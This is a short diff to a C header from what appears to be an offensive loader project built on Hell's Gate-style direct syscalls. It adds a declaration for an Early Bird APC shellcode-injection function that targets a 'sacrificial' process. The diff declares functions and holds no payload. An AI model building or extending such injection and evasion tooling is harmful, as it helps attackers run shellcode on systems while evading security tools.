@@ -41,6 +41,7 @@ extern VOID WhisperHell(WORD wSystemCall);
 
 // Defined in Injection.c
 BOOL RemoteMappingInjectionViaSyscalls(IN HANDLE hProcess, IN PVOID pPayload, IN SIZE_T sPayloadSize, IN BOOL bIsLocalInjection);
+BOOL RemoteEarlyBirdApcInjectionViaSyscalls(HANDLE hParentProcess, LPCSTR pstrSacrificalProcessName, PVOID pShellcodeAddress, SIZE_T sSizeOfShellcode);
 
 /// Global variables
 extern VX_TABLE g_SyscallsTable;
